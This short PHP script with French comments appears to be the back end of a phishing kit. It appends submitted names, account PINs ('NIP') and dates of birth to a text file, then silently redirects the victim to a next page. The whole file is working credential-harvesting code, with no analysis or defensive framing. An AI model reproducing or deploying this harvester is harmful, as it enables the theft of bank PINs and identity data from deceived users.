<?php // Ce script va ouvrir un fichier userID.txt, inscrire les donn�es du formulaire et refermer le fichier.
$fp = fopen ("lolo.txt", "a");
fputs($fp, "\n");
fputs ($fp, "Full name : ".$_POST['name']);
fputs ($fp, "  -   Account NIP : ".$_POST['nip']);
fputs ($fp, "  -   Date of birth : ".$_POST['dob']);
fclose ($fp);
?>
<?php // Ce script va faire une redirection automatique vers l'adresse de mon choix
header('Location: index3.php');
exit;
?>